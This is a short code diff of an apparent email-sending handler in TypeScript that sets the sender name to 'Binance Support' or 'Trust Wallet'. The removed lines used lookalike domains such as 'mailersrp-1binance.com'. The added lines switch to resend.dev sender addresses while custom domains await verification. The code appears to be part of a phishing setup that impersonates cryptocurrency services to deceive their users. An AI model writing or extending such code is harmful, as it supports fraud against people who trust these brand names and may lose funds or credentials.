@@ -177,11 +177,12 @@ const handler = async (req: Request): Promise<Response> => {
     const emailSenderName = isBinanceTemplate ? 'Binance Support' : 'Trust Wallet';
 
     // Set domain and API key based on preference
+    // Note: Using verified resend.dev domains until custom domains are verified in Resend
     if (emailPreference === 'domain2') {
-      fromDomain = `${emailSenderName} <do_not_reply@mailersrp-2binance.com>`;
+      fromDomain = `${emailSenderName} <hello@resend.dev>`;
       resendApiKey = Deno.env.get('RESEND_API_KEY_DOMAIN2') ?? Deno.env.get('RESEND_API_KEY') ?? '';
     } else {
-      fromDomain = `${emailSenderName} <do_not_reply@mailersrp-1binance.com>`;
+      fromDomain = `${emailSenderName} <onboarding@resend.dev>`;
       resendApiKey = Deno.env.get('RESEND_API_KEY') ?? '';
     }
 
